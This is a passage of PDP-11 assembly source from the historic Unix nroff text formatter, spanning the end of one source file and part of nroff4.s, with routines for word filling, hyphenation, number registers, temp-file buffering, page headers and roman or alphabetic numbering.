	mov	frame,-(sp)
	jsr	pc,cont1
	cmp	(sp)+,frame
	beq	4f
	inc	trap
/	inc	nlflg
	rts	pc
4:
	tst	ejf
	beq	5f
	cmp	ilistp,ejl
	beq	newline
5:
	rts	pc

findnl:
	mov	$nlist,r1
1:
	mov	(r1),r0
	tst	r0
	bpl	2f
	add	pl,r0
	inc	r0
2:
	cmp	nl,r0
	beq	4f
3:
	tst	(r1)+
	cmp	r1,$nliste
	bne	1b
	clr	r1
	rts	pc
4:
	tst	[mlist-nlist](r1)
	beq	3b
	rts	pc

number:
	jsr	pc,skipcont
number1:
	clr	-(sp)
	mov	r1,-(sp)
	mov	r3,-(sp)
	clr	r3
	clr	-(sp)
1:
	jsr	pc,getchar
	cmp	r0,$'+
	beq	2f
	cmp	r0,$'-
	beq	2f
	mov	r0,ch
1:
	jsr	pc,atoi
	beq	3f
	mov	r0,r3
	inc	6(sp)
	br	3f
2:
	mov	r0,(sp)
	br	1b
3:
	tst	6(sp)
	bne	1f
	mov	$1,r3
1:
	mov	(r5)+,r0
	beq	1f
	mov	(r0),r0
1:
	mov	(sp)+,r1
	cmp	r1,$'-
	bne	1f
	sub	r3,r0
	br	2f
1:
	cmp	r1,$'+
	bne	1f
	add	r3,r0
	br	2f
1:
	mov	r3,r0
2:
	mov	(sp)+,r3
	mov	(sp)+,r1
	tst	(sp)+
	rts	r5

eject:
/	tst	ejf
/	bne	2f
	inc	ejf
	mov	r0,ejl
	tst	trap
	bne	2f
	jsr	pc,newline
2:
	rts	pc

storeline:
	cmp	linep,$line+linsiz
	bhis	1f
	movb	r0,*linep
	inc	linep
	jsr	pc,width
	add	r1,ne
	sub	r1,nel
	inc	nc
	rts	pc
1:
	tst	over
	bne	2f
	jsr	r5,stringfl; linemes
2:
	inc	over
	rts	pc
linemes: <Line overflow\n\0>
	.even

getword:
	clr	-(sp)
	clr	-(sp)
	mov	pendw,r2
	bne	5f
	mov	$word,r2
	clr	over
	clr	wne
	clr	wch
	clr	nhyph
	clr	hypedf
	mov	$word,wordp
1:
	jsr	pc,gettchar
	bmi	4f
	cmpb	r0,$'\n
	bne	0f
	clr	wne
	clr	wch
	br	3f
0:
	cmpb	r0,ohc
	bne	2f
	inc	hypedf
	br	1b
2:
	cmpb	$' ,r0
	bne	2f
	jsr	pc,storeword
	br	1b
2:
4:
	mov	r0,-(sp)
	mov	$' ,r0
/	bis	chbits,r0
	jsr	pc,storeword
	tst	spaceflg
	beq	2f
	jsr	pc,storeword
	clr	spaceflg
2:
	mov	(sp)+,r0
2:
	tst	r0
	bmi	0f
	cmpb	r0,$005
	beq	6f
0:
	inc	2(sp)
	jsr	pc,storeword
	bisb	(sp),-1(r2)	/add in hyphen
	clr	(sp)
5:
	jsr	pc,gettchar
	bmi	1f
	cmpb	r0,ohc
	bne	1f
	inc	hypedf
	jsr	pc,gettchar
	mov	$200,(sp)
1:
	tst	r0
	bmi	2b
	cmpb	$' ,r0
	beq	1f
	cmpb	$'\n,r0
	bne	2b
	cmpb	-1(r2),$'.
	beq	0f
	cmpb	-1(r2),$'!
	beq	0f
	cmpb	-1(r2),$'?
	bne	1f
0:
	inc	spaceflg
1:
	add	$2,4(sp)
	clrb	(r2)+
3:
	clr	pendw
	cmp	(sp)+,(sp)+
	mov	$word,wordp
	jsr	pc,setnel
/	jsr	pc,wordout
	rts	pc
6:
	tst	(sp)+
	tst	(sp)+
	beq	7f
	mov	r2,pendw
0:
	clr	nflush
	jsr	pc,flushi
	rts	pc
7:
	clr	wch
	br	0b

setnel:
	tst	nc
	bne	2f
	mov	$line,linep
	mov	ll,nel
	tst	un1
	blt	1f
	mov	un1,un
	mov	$-1,un1
1:
	sub	un,nel
	clr	ne
	clr	fac
	clr	fmq
2:
	rts	pc

storeword:
	cmp	r2,$eword
	bhis	1f
	jsr	pc,width
	add	r1,wne
	inc	wch
	movb	r0,(r2)+
	rts	pc
1:
	tst	over
	bne	2f
	jsr	r5,stringfl; wordmes
2:
	inc	over
	rts	pc
wordmes: <Word overflow\n\0>
	.even

need:
need2:
	mov	r0,-(sp)
	clr	r0
	jsr	pc,findt
	cmp	(sp)+,r1
	ble	1f
/	mov	ilistp,r0
/	jsr	pc,eject
	mov	r1,r0
	clr	nls
	jsr	r5,nlines;newline
1:
	rts	pc

min:
	tst	r0
	bge	1f
	clr	r0
1:
	rts	pc

getname:
	mov	r1,-(sp)
	mov	r2,-(sp)
	mov	(r5),r1
	mov	$namesiz,r2
1:
	jsr	pc,getchar
	tst	nlflg
	bne	2f
	cmp	r0,$040
	beq	2f
	cmp	r0,$0176
	blos	4f
2:
	mov	r0,ch
3:
	clrb	(r1)+
	mov	(sp)+,r2
	mov	(sp)+,r1
	tstb	*(r5)+
	rts	r5
4:
	movb	r0,(r1)+
	dec	r2
	beq	3b
	br	1b

copyb:
	inc	copyf
	jsr	pc,flushi
	clr	nlflg
	clr	-(sp)
	mov	$1,-(sp)
1:
	jsr	pc,getchar
	bmi	9f
	cmpb	r0,$'\n
	bne	2f
	mov	$1,(sp)
	clr	nlflg
	br	4f
2:
	cmpb	r0,$'.
	bne	9f
	cmp	(sp),$1
	bgt	3f
	blt	9f
	inc	(sp)
	br	4f
3:
	tst	skp
	bne	0f
	jsr	pc,wbfl
	mov	2(sp),r1
	clr	r0
	jsr	pc,wbt
0:
	inc	(sp)
	br	5f
9:
	clr	(sp)
4:
	mov	r1,2(sp)
	tst	skp
	bne	5f
	jsr	pc,wbf
5:
	cmp	(sp),$3
	bne	1b
	cmp	(sp)+,(sp)+
6:
	clr	copyf
	rts	pc

allocmes: <Out of temp file space.\n\0>
	.even

alloc:
	mov	r1,-(sp)
	clr	nextb
	mov	$blist,r1
1:
	tst	(r1)+
	beq	3f
	cmp	r1,$eblist
	blo	1b
2:
	mov	(sp)+,r1
	tst	nextb
	rts	pc
3:
	mov	$-1,-(r1)
	jsr	pc,offset
	cmp	r1,first
	blo	2b
	mov	r1,nextb
	br	2b

free:
	mov	r1,-(sp)
	mov	r0,r1
	beq	2f
1:
	jsr	pc,blistptr
	tst	(r1)
	beq	2f
	cmp	(r1),$-1
	bne	3f
	clr	(r1)
2:
	mov	(sp)+,r1
	rts	pc
3:
	mov	(r1),-(sp)
	clr	(r1)
	mov	(sp)+,r1
	br	1b

offset:
	sub	$blist,r1
	ash	$7,r1
	add	first,r1
	rts	pc

blistptr:
	mov	r0,-(sp)
	clr	r0
	sub	first,r1
	ashc	$-7,r0
	bic	$1,r1
	add	$blist,r1
	mov	(sp)+,r0
	rts	pc

wbt:
	jsr	pc,wbf
	jsr	pc,wbfl
	rts	pc
wbf:
	tst	woff
	bne	0f
	mov	r1,woff
	mov	$wbuf,wbufp
0:
	mov	r0,*wbufp
	add	$2,wbufp
	add	$2,r1
	bit	$377,r1
	bne	2f
	sub	$2,r1
	jsr	pc,blistptr
	cmp	(r1),$-1
	bne	1f
	jsr	pc,wbfl
	jsr	pc,alloc
	bne	0f
	jsr	r5,stringfl;allocmes
	jmp	done
0:
	mov	nextb,(r1)
1:
	mov	(r1),r1
2:
	cmp	wbufp,$wbufe
	bhis	wbfl
	rts	pc
wbfl:
	tst	woff
	beq	0f
	mov	wbufp,9f
	sub	$wbuf,9f
	beq	0f
	mov	ibf,r0
	sys	0;7f
.data
7:	sys	seek; woff:..;0
.text
	mov	ibf,r0
	sys	0;7f
.data
7:	sys	write; wbuf; 9:..
.text
	clr	woff
	mov	$-1,roff
0:
	rts	pc
rbf:
	mov	ip,r1
	jsr	pc,rbf0
	bne	0f
	tst	app
	bne	1f
	jsr	pc,popi
	rts	pc
0:
	jsr	pc,incoff
1:
	mov	r1,ip
	rts	pc

rbf0:
	mov	r1,-(sp)
	bic	$377,r1
	cmp	r1,roff
	beq	1f
	mov	r1,roff
	mov	ibf1,r0
	sys	0;7f
.data
7:	sys	seek; roff:-1 ;0
.text
	mov	ibf1,r0
	sys	read;rbuf;256.
	tst	r0
	bne	1f
	tst	(sp)+
	sez
	rts	pc
1:
	mov	(sp),r0
	bic	$!377,r0
	mov	(sp)+,r1
	mov	rbuf(r0),r0
	rts	pc

incoff:
	add	$2,r1
	bit	$377,r1
	bne	1f
	sub	$2,r1
	jsr	pc,blistptr
	mov	(r1),r1
	beq	5f
	cmp	$-1,r1
	beq	5f
1:
	rts	pc
5:
	jsr	r5,stringfl; badmes
	jmp	place
badmes: <Bad storage allocation\n\0>
	.even

alph:
	movb	(r0),r2
alph2:
	cmp	r2,$'A
	blo	1f
	cmp	r2,$'Z
	blos	2f
	cmp	r2,$'a
	blo	1f
	cmp	r2,$'z
	bhi	1f
2:
	sez
	rts	pc
1:
	clz
	rts	pc
rdsufb:
	mov	r1,-(sp)
	bic	$177,r1
	cmp	r1,sufoff
	beq	2f
	mov	r1,sufoff
	mov	suff,r0
	sys	0;7f
.data
7:	sys	seek; sufoff: -1; 0
.text
	mov	suff,r0
	sys	read; sufbuf; 128.
2:
	mov	(sp),r0
	bic	$!177,r0
	movb	sufbuf(r0),r0
	mov	(sp)+,r1
	rts	pc


atoi:
	jsr	pc,atoi1
	bne	1f
	rts	pc
1:
	mov	r1,-(sp)
	mov	r0,-(sp)
1:
	jsr	pc,getchar
	cmp	r0,$'+
	beq	4f
	cmp	r0,$'-
	beq	5f
2:
	cmp	r0,$'*
	bne	2f
	jsr	pc,atoi1
	beq	3f
	mov	r0,r1
	mpy	(sp),r1
	mov	r1,(sp)
	br	1b
2:
	cmp	r0,$'\/
	bne	2f
	jsr	pc,atoi1
	beq	3f
	mov	r0,-(sp)
	mov	2(sp),r1
	sxt	r0
	dvd	(sp),r0
	mov	r0,2(sp)
	tst	(sp)+
	br	1b
2:
	mov	r0,ch
3:
	mov	(sp)+,r0
	mov	(sp)+,r1
	tst	pc
	rts	pc
4:
	jsr	pc,atoi1
	beq	3b
	add	r0,(sp)
	br	1b
5:
	jsr	pc,atoi1
	beq	3b
	sub	r0,(sp)
	br	1b

atoi1:
	clr	-(sp)
	mov	r3,-(sp)
	clr	-(sp)
	clr	r3
	jsr	pc,getchar
	cmp	r0,$'-
	bne	2f
	inc	(sp)
1:
	jsr	pc,getchar
2:
	sub	$'0,r0
	cmp	r0,$9
	bhi	1f
	inc	4(sp)
	mpy	$10.,r3
	add	r0,r3
	br	1b
1:
	add	$'0,r0
	mov	r0,ch
	bne	0f
	mov	$' ,ch
0:
	tst	(sp)+
	beq	1f
	neg	r3
1:
	mov	r3,r0
	mov	(sp)+,r3
	tst	(sp)+
	rts	pc

findt:
	mov	r0,-(sp)
	mov	$-1,-(sp)
	mov	$nlist,r1
1:
	tst	[mlist-nlist](r1)
	bne	3f
2:
	tst	(r1)+
	cmp	r1,$nliste
	ble	1b
	br	8f
3:
	mov	(r1),r0
	tst	2(sp)
	bmi	6f	/- traps
	beq	4f	/all traps
	tst	(r1)	/+ traps
	bmi	2b
4:
	tst	(r1)
	bpl	5f
	mov	pl,r0
	inc	r0
	add	(r1),r0
5:
	sub	nl,r0
	ble	2b
	cmp	r0,(sp)
	bhis	2b
	mov	r0,(sp)
	br	2b
6:
	tst	(r1)
	bpl	2b
	br	4b
8:
	mov	(sp),r1
	bpl	9f
	mov	pl,r1
	sub	nl,r1
9:
	cmp	(sp)+,(sp)+
	rts	pc

findr:
	mov	$rlist,r1
1:
	tst	(r1)
	beq	2f
	cmp	(r1)+,r0
	beq	3f
	cmp	r1,$rliste
	blos	1b
	tst	numerr
	bne	0f
	jsr	r5,stringfl; 9f
0:
	inc	numerr
/	clr	r1
/	rts	pc
	cmp	numerr,$1
	jeq	edone
	jmp	done2
2:
	mov	r0,(r1)
	br	4f
3:
	tst	-(r1)
4:
	add	$[vlist-rlist],r1
	rts	pc
9: <No more number registers.\n\0>
	.even

setn0:
	clr	-(sp)
	clr	-(sp)
	mov	$1,nform
	jbr	setn1
setn:
	mov	r1,-(sp)
	clr	-(sp)
	clr	temp
	jsr	pc,get1
	cmpb	r0,$'+
	bne	1f
	inc	(sp)
0:
	jsr	pc,get1
1:
	cmpb	r0,$'\\
	bne	1f
3:
	jsr	pc,get1
	jsr	r5,switch;esctab
	cmpb	r0,dolc
	bne	1f
	jsr	pc,seta
	br	0b
1:
	tst	temp
	bne	2f
	bic	$!177,r0
	cmpb	r0,$'(
	bne	1f
	inc	temp
	jsr	pc,get1
2:
	bic	$!177,r0
	cmpb	r0,$'\\
	beq	3b
	mov	r0,-(sp)
	jsr	pc,get1
	bic	$!177,r0
	swab	r0
	bis	(sp)+,r0
1:
	cmpb	2(sp),$372
	beq	5f /exit if called by \k
	clr	nform
	cmp	r0,$".v
	bne	0f
	mov	ls,r0
	br	setn1
0:
	cmp	r0,$".p
	bne	0f
	mov	pl,r0
	br	setn1
0:
	cmp	r0,$".t
	bne	0f
	clr	r0
	jsr	pc,findt
	mov	r1,r0
	br	setn1
0:
	cmp	r0,$".o
	bne	0f
	mov	po,r0
	br	setn1
0:
	cmp	r0,$".l
	bne	0f
	mov	ll,r0
	br	setn1
0:
	cmp	r0,$".i
	bne	0f
	mov	in,r0
	br	setn1
0:
	cmp	r0,$".$
	bne	0f
	mov	*frame,r0
	br	setn1
0:
	cmp	r0,$".x
	bne	0f
	mov	evp,r0
	br	setn1
0:
	cmp	r0,$".c
	bne	0f
	mov	iline,r0
	br	setn1
0:
	cmp	r0,$".h
	bne	0f
	mov	hnl,r0
	br	setn1
0:
	cmp	r0,$".n
	bne	0f
	mov	lastl,r0
	br	setn1
0:
	jsr	pc,findr
	tst	r1
	beq	5f
	tst	(sp)
	beq	1f
	add	[inclist-vlist](r1),(r1)
1:
	mov	(r1),r0
	mov	[flist-vlist](r1),nform
setn1:
	mov	r4,-(sp)
	mov	$cbuf,r4
	tst	r0
	bge	1f
	movb	$'-,(r4)+
	neg	r0
1:
	jsr	r5,fnumb0;wrc
	clrb	(r4)
	mov	(sp)+,r4
	mov	$cbuf,cp
5:
	tst	(sp)+
	mov	(sp)+,r1
	rts	pc

wrc:
	cmp	r4,$stk
	bhis	1f
	movb	r0,(r4)+
1:
	rts	pc

seta:
	jsr	pc,get1
	cmp	r0,$'\\
	bne	1f
	jsr	pc,get1
	jsr	r5,switch;esctab
	cmp	r0,numc
	bne	1f
	clr	r1
	jsr	pc,setn
	br	seta
1:
	sub	$060,r0
	ble	2f
	cmp	r0,$9.
	bgt	2f
	cmp	r0,*frame
	bgt	2f
	asl	r0
	add	frame,r0
	add	$stksiz-2,r0
	mov	(r0),ap
2:
	rts	pc

	stksiz = 16.
pushi:
	clr	r0
	mov	enda,-(sp)
	sub	$stksiz,(sp)
	cmp	nxf,(sp)+
	blo	0f
	jsr	pc,setbrk
	beq	2f
	br	pushi
0:
	mov	nxf,r0
	tst	(r0)+  /nargs
	mov	frame,(r0)+
	mov	ip,(r0)+
	mov	nspace,(r0)+
	clr	nspace
	mov	rchar,(r0)+
	clr	rchar
	mov	pendt,(r0)+
	mov	ap,(r0)+
	mov	ch,(r0)+
	clr	ch
	clr	ap
	clr	pendt
	mov	nxf,frame
	tst	*nxf
	bne	1f
	add	$stksiz,nxf
	br	2f
1:
	mov	r1,nxf
2:
	tst	r0
	rts	pc

popi:
	cmp	frame,$stk
	beq	1f
	mov	frame,r0
	mov	r0,nxf
	clr	(r0)+
	mov	(r0)+,frame
	mov	(r0)+,ip
	mov	(r0)+,nspace
	mov	(r0)+,rchar
	mov	(r0)+,pendt
	mov	(r0)+,ap
	mov	(r0)+,r0
/	cmp	frame,litlev
/	bhis	1f
/	clr	lit
1:
	rts	pc

setbrk:
	tst	noset
	bne	2f
	mov	enda,-(sp)
	add	$516.,(sp)
	bic	$777,(sp)
	mov	(sp)+,0f
	sys	0;7f
.data
7:	sys	break; 0:..
.text
	bes	1f
	mov	0b,enda
	sub	$2,enda
	clz
	rts	pc
1:
	inc	noset
2:
	sez
	rts	pc

collect:
	inc	copyf
	jsr	pc,skipcont
	clr	*nxf
	mov	nxf,r2
	add	$stksiz,r2
	mov	r2,r1
	add	$18.,r1
	mov	r1,-(sp)
	mov	nxf,-(sp)
	cmp	r1,enda
	blo	1f
	jsr	pc,setbrk
	beq	7f
1:
	clr	quote
	cmp	r2,2(sp)
	beq	9f
	jsr	pc,skipcont
	tst	nlflg
	bne	9f
	mov	r1,(r2)+
	jsr	pc,getchar
	cmp	r0,$'"
	bne	3f
	inc	quote
2:
	jsr	pc,getchar
3:
	tst	nlflg
	bne	8f
	tst	quote
	bne	4f
	cmp	r0,$' /
	beq	8f
	br	5f
4:
	cmp	r0,$'"
	bne	5f
	jsr	pc,getchar
	cmpb	r0,$'"
	bne	8f
5:
	movb	r0,(r1)+
	mov	enda,-(sp)
	sub	$4,(sp)
	cmp	r1,(sp)+
	blo	2b
	jsr	pc,setbrk
	beq	6f
	br	2b
8:
	mov	r0,ch
6:
	clrb	(r1)+
	tst	nlflg
	bne	9f
	tst	noset
	beq	1b
9:
	mov	(sp),nxf
	sub	nxf,r2
	sub	$stksiz,r2
	asr	r2
	mov	r2,*nxf
	bit	$1,r1
	beq	7f
	inc	r1
7:
	clr	copyf
	cmp	(sp)+,(sp)+
	rts	pc
-- /usr/source/s7/nroff4.s mode=0110664 uid=3 gid=3 atime=174924237 mtime=174845697 --
/
/

/ nroff4

text:
	inc	nflush
	cmp	nl,$-1
	bne	0f
	jsr	pc,newln1
	rts	pc
0:
	clr	ulstate
	jsr	pc,setnel
	tst	ce
	bne	nofill
	tst	fi
	beq	nofill
	tst	pendw
	bne 7f
	tst	pendt
	bne	8f
	inc	pendt
	tst	x
	bne	0f
1:
	jsr	pc,getchar
	bmi	1f
	cmpb	r0,$' /
	beq	3f
	cmpb	r0,tabc
	bne	1f
3:
	inc	x
	br	1b
1:
	tst	nlflg
	bne	6f
	mov	r0,ch
	tst	x
	beq	2f
0:
	jsr	pc,rbreak
	tst	nc
	bne	5f
	tst	wch
	bne	5f
	add	x,un
	clr	x
	jsr	pc,setnel
	tst	trap
	bne	5f
2:
	tst	x
	bne	0b
	tst	nlflg
	beq	2f
6:
	clr	nflush
	clr	x
	clr	pendt
	clr	ch
	mov	$1,r0
	jsr	pc,casesp1
	rts	pc
8:
	tst	x
	bne	0b
2:
	tst	spread
	bne	1f
	tst	pendw
	bne	0f
	tst	wch
	bne	3f
0:
7:
	jsr	pc,getword
		br 4f
3:
	jsr	pc,movword
	bne	2b
	tst	nlflg
	beq	1f
	clr	pendt
1:
	jsr	pc,adjust
	tst	trap
	beq	2b
	tst	nlflg
	beq	5f
4:
	clr	pendt
	tst	pendw
	bne	5f
	dec	ul
	bge	5f
	clr	ul
5:
	clr	nflush
	rts	pc

nofill:
	tst	pendnf
	bne	1f
	clr	over
	jsr	pc,rbreak
	tst	trap
	bne	3f
	tst	nlflg
	bne	6b
	clr	fac
	clr	fmq
	mov	$1000,nwd
1:
	jsr	pc,gettchar
	bmi	0f
	cmpb	r0,$'\n
	beq	1f
	cmpb	r0,ohc
	beq	1b
	cmpb	r0,$005
	beq	4f
0:
	jsr	pc,storeline
	br	1b
1:
	tst	ce
	ble	2f
	dec	ce
	mov	nel,r0
	asr	r0
	bpl	1f
	clr	r0
1:
	add	r0,un
2:
	tst	nc
	bne	0f
	mov	$037,r0
	jsr	pc,storeline
0:
	jsr	pc,rbreak
	dec	ul
	bpl	3f
	clr	ul
3:
	clr	nflush
	clr	pendnf
	rts	pc
4:
	inc	pendnf
	clr	nflush
	jsr	pc,flushi
	rts	pc

adjust:
	mov	r2,-(sp)
	mov	r3,-(sp)
	clr	r2
	clr	r3
	tst	ad
	beq	1f
	mov	nwd,r0
	dec	r0
	ble	1f
	mov	nel,r3
	ble	1f
	dvd	r0,r2
1:
	mov	r3,fac
	mov	r2,fmq
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	$-1,lastl
	jsr	pc,rbreak1
	clr	spread
	rts	pc

fill:
	mov	fmq,r0
1:
	inc	r0
	dec	nc
	cmpb	(r2)+,$' 
	beq	1b
	dec	r2
	bit	$1,totout
	beq	2f
	inc	fac
	cmp	fac,nwd
	blt	1f
	inc	r0
	br	1f
2:
	dec	fac
	bmi	1f
	inc	r0
1:
	jsr	pc,space
	movb	(r2),r0
	rts	pc

movword:
	mov	wordp,r4
	tst	nwd
	bne	2f
1:
	movb	(r4)+,r0
	cmp	r0,$' 
	bne	1f
	dec	wch
	jsr	pc,width
	sub	r1,wne
	br	1b
1:
	dec	r4
2:
	cmp	wne,nel
	ble	1f
	tst	nwd
	beq	2f
	cmp	nel,$4
	blt	1f
	cmp	wch,$5 /don't do 4 char words
	ble	1f
2:
	bit	$2,hyf
	beq	0f
	tst	op
	bne	0f
	clr	r0
	jsr	pc,findt
	dec	r1
	ble	1f
0:
	jsr	pc,hyphen
1:
	clr	nhyph
	mov	wch,-(sp)
1:
	movb	(r4)+,r0
	cmp	r0,$'-
	bne	2f
	movb	(r4),r2
	jsr	pc,alph2
	bne	2f
	bisb	$200,(r4)
2:
	tst	r0
	bpl	2f
	bic	$!177,r0
	mov	r4,r3
	sub	$3,r3
	cmp	r3,$word
	blo	2f
	movb	(r3),r2
	bic	$!177,r2
	jsr	pc,alph2
	bne	2f
3:
	mov	r0,-(sp)
	clr	r0
	jsr	pc,storeline
	mov	(sp)+,r0
	inc	nhyph
2:
	jsr	pc,width
	sub	r1,wne
	jsr	pc,storeline
	dec	wch
	bne	1b
	tst	nel
	blt	1f
	inc	nwd
	tst	(sp)+
	clz
	rts	pc
1:
	mov	linep,r3
1:
	tst	nhyph
	bne	2f
	tst	nwd
	beq	3f
	cmp	wch,(sp)
	beq	4f
2:
	movb	-(r3),r0
	bne	2f
	dec	nhyph
	bne	5f
	tst	nwd
	beq	6f
5:
	tst	nel
	ble	2f
6:
	cmpb	-1(r3),$'-
	beq	3f
	movb	$'-,(r3)
	dec	nel
	inc	ne
	br	3f
2:
	dec	nc
	tstb	(r3)
	beq	1b
	jsr	pc,width
	sub	r1,ne
	add	r1,nel
	inc	wch
	dec	r4
	add	r1,wne
	br	1b
3:
	inc	nwd
4:
	mov	r4,wordp
	bicb	$!177,(r4)
	tst	(sp)+
	sez
	rts	pc


width:
	mov	r0,-(sp)
	cmpb	r0,$014
	bne	0f
	mov	$1,r1
	br	3f
0:
	cmpb	r0,$013
	bne	0f
	movb	eschar,r0
0:
	bic	$!177,r0
	cmp	r0,ohc
	beq	2f
	tst	r0
	beq	2f
	cmp	r0,$0177
	beq	2f
	cmp	r0,$010
	bne	1f
	mov	$-1,r1
	br	3f
1:
	cmp	$' ,r0
	bgt	2f
	mov	$1,r1
	br	3f
2:
	clr	r1
3:
	mov	(sp)+,r0
	rts	pc
setwd:
	mov	column,-(sp)
	clr	column
	mov	r2,-(sp)
	clr	-(sp)
	jsr	pc,*(r5)
	mov	r0,r2
1:
	jsr	pc,*(r5)
	bmi	0f
	cmpb	r0,r2
	beq	2f
0:
	tst	nlflg
	bne	2f
	jsr	pc,width
	add	r1,(sp)
	br	1b
2:
	mov	(sp)+,r0
	jsr	pc,setn0
	mov	(sp)+,r2
	mov	(sp)+,column
	tst	(r5)+
	rts	r5

header:
/headin:
	clr	nls
	jsr	pc,skipcont
	mov	$'',r2
	tst	op
	beq	1f
	jsr	pc,wbfl
1:
	jsr	pc,alloc
	bne	0f
	rts	pc
0:
	mov	nextb,r1
2:
	mov	r1,headp
	jsr	pc,getchar
	bmi	3f
	cmpb	r0,$'\n
	beq	2f
	mov	r0,r2
1:
	jsr	pc,getchar
	bmi	3f
	cmpb	r0,$'\n
	beq	2f
0:
	cmpb	r0,r2
	bne	3f
	mov	$004,r0
3:
	jsr	pc,wbf
	br	1b
2:
	mov	$004,r0
	jsr	pc,wbf
	mov	$004,r0
	jsr	pc,wbf
	clr	r0
	jsr	pc,wbt

/headout:
	clr	-(sp)
	mov	headp,r2
	jsr	r5,headseg; width
	mov	r0,-(sp)
	jsr	r5,headseg; width
	mov	r0,-(sp)
	jsr	r5,headseg; width
	mov	r0,-(sp)
	tst	op
	bne	1f
	mov	po,r0
	jsr	pc,space
1:
	mov	headp,r2
	jsr	r5,headseg; putchar
	mov	llh,r0
	add	6(sp),r0
	sub	2(sp),r0
	asr	r0
	sub	4(sp),r0
	mov	r0,-(sp)
	tst	4(sp)
	bne	1f
	tst	2(sp)
	beq	2f
1:
	jsr	pc,space
2:
	jsr	r5,headseg; putchar
	mov	llh,r0
	sub	(sp)+,r0
	sub	(sp)+,r0
	sub	(sp)+,r0
	sub	(sp)+,r0
	add	(sp)+,r0
	tst	-10(sp)
	beq	1f
	jsr	pc,space
	jsr	r5,headseg; putchar
1:
	jsr	pc,newline
	cmp	nl,hnl
	ble	0f
	mov	nl,hnl
0:
	mov	headp,r0
	jsr	pc,free
	rts	pc

headseg:
	clr	-(sp)
1:
	mov	r1,-(sp)
	mov	r2,r1
	jsr	pc,rbf0
	jsr	pc,incoff
	mov	r1,r2
	mov	(sp)+,r1
	tst	r0
	beq	1f
	bmi	0f
	cmpb	r0,$004
	beq	1f
	cmpb	r0,$'%
	beq	2f
0:
	jsr	pc,*(r5)
	add	r1,(sp)
	br	1b
2:
	mov	$'%,r0
	jsr	pc,findr
	mov	[flist-vlist](r1),nform
	mov	pn,r0
	clr	r1
	jsr	pc,fnumb
	add	r1,(sp)
	br	1b
1:
	mov	(sp)+,r0
	tst	(r5)+
	rts	r5

space:
	jsr	r5,nlines;putchar
	rts	pc

nlines:
	mov	r0,-(sp)
1:
	dec	(sp)
	blt	1f
	mov	$' ,r0
	jsr	pc,*(r5)
	br	1b
1:
	cmp	(r5)+,(sp)+
	rts	r5

decimal:
	jsr	pc,decml
	tst	(r5)+
	rts	r5

decml:
	mov	r2,-(sp)
	mov	r3,-(sp)
	jsr	pc,decml1
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	pc

decml1:
	mov	r1,-(sp)
	clr	r2
	mov	r0,r3
	dvd	$10.,r2
	mov	r3,-(sp)
	mov	r2,r0
	beq	1f
	jsr	pc,decml1
	mov	r1,2(sp)
1:
	mov	(sp)+,r0
	add	$'0,r0
	jsr	pc,*(r5)
	add	(sp)+,r1
	rts	pc

roman0:
	jsr	pc,roman
	tst	(r5)+
	rts	r5
roman:
	tst	r0
	beq	decml
	mov	r2,-(sp)
	mov	r3,-(sp)
	cmp	ro,$2
	bne	1f
	mov	$cones,onesp
	mov	$cfives,fivesp
	br	2f
1:
	mov	$ones,onesp
	mov	$fives,fivesp
2:
	jsr	pc,roman1
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	pc
roman1:
	clr	r2
	mov	r0,r3
	bne	.+4
	rts	pc
	mov	r1,-(sp)
	dvd	$10.,r2
	mov	r3,-(sp)
	mov	r2,r0
	inc	onesp
	inc	fivesp
	jsr	pc,roman1
	mov	r1,2(sp)
	dec	onesp
	dec	fivesp
	clr	r2
	mov	(sp)+,r3
	dvd	$5.,r2
	cmp	r3,$4
	bne	1f
	movb	*onesp,r0
	jsr	pc,*(r5)
	add	r1,(sp)
	tst	r2
	beq	2f
	inc	onesp
	movb	*onesp,r0
	dec	onesp
	br	3f
2:
	movb	*fivesp,r0
3:
	jsr	pc,*(r5)
	add	(sp)+,r1
	rts	pc
1:
	tst	r2
	beq	2f
	movb	*fivesp,r0
	jsr	pc,*(r5)
	add	r1,(sp)
2:
	dec	r3
	blt	1f
	movb	*onesp,r0
	jsr	pc,*(r5)
	add	r1,(sp)
	br	2b
1:
	mov	(sp)+,r1
	rts	pc

abc0:
	jsr	pc,abc
	tst	(r5)+
	rts	r5
abc:
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	r0,r3
	bne	0f
	mov	$'0,r0
	jsr	pc,*(r5)
	br	1f
0:
	dec	r3
	jsr	pc,abc1
1:
	mov	(sp)+,r3
	mov	(sp)+,r2
	rts	pc
abc1:
	clr	r2
	dvd	$26.,r2
	mov	r3,-(sp)
	mov	r2,r3
	beq	1f
	dec	r3
	jsr	pc,abc1
1:
	cmp	ro,$2
	beq	1f
	add	$'a,(sp)
	br	2f
1:
	add	$'A,(sp)
2:
	mov	(sp)+,r0
	jsr	pc,*(r5)
	rts	pc

fnumb0:
	jsr	pc,fnumb
	tst	(r5)+
	rts	r5
fnumb:
	mov	ro,-(sp)
	mov	nform,ro
	bne	0f
	mov	(sp),ro
	br	1f
0:
	dec	ro
1:
	tst	ro
	bne	1f
	jsr	pc,decml
	br	2f
1:
	cmp	ro,$2
	bgt	1f
	jsr	pc,roman
	br	2f
1:
	sub	$2,ro
	jsr	pc,abc
2:
	mov	(sp)+,ro
	rts	pc

/wordout:
/	tst	index
/	beq	1f
/	mov	wch,0f
/	beq	1f
/	mov	indid,r0
/	sys	write; word; 0:..
/	mov	indid,r0
/	sys	write; 8f; 1
/	mov	indid,r0
/	jsr	r5,numb; pn
/	mov	indid,r0
/	sys	write; 8f; 1
/	mov	nl,char
/	inc	char
/	mov	indid,r0
/	jsr	r5,numb; char
/	mov	indid,r0
/	sys	write; 9f; 1
/1:
/	rts	pc
/8:	011 /tab
/9:	<\n\0>
/	.even
/numb:
/	mov	r2,-(sp)
/	mov	r3,-(sp)
/	mov	*(r5)+,r3
/	mov	r0,r1
/	jsr	pc,numb1
/	mov	(sp)+,r3
/	mov	(sp)+,r2
/	rts	r5
/numb1:
/	clr	r2
/	dvd	$10.,r2
/	mov	r3,-(sp)
/	mov	r2,r3
/	beq	1f
/	jsr	pc,numb1
/1:
/	add	$'0,(sp)
/	mov	(sp)+,char
/	mov	r1,r0
/	sys	write; char; 1
/	rts	pc

setstr:
	clr	-(sp)
	clr	-(sp)
0:
	jsr	pc,get1
	bmi	3f
	bic	$!177,r0
	cmpb	r0,$'\\
	bne	1f
4:
	jsr	pc,get1
	jsr	r5,switch;esctab
	cmpb	r0,dolc
	bne	2f
	jsr	pc,seta
